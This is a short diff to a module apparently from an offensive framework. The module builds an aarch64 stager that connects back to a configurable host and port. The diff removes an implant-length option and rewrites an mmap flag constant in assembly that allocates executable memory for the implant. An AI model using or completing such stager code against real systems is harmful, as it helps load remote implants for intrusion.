@@ -26,7 +26,6 @@ class PawnModule(Module, Assembler):
 
         self.host = IPv4Option(None, 'Host to connect to.', True)
         self.port = PortOption(None, 'Port to connect to.', True)
-        self.length = IntegerOption(4096, 'Length of the implant.', True)
         self.reliable = BooleanOption('yes', 'Make payload reliable.', True)
 
     def run(self):
@@ -74,7 +73,7 @@ class PawnModule(Module, Assembler):
             mov x0, xzr
             mov x1, x2
             mov x2, 7
-            mov x3, 34
+            mov x3, 0x22
             mov x4, xzr
             mov x5, xzr
             mov x8, 0xde
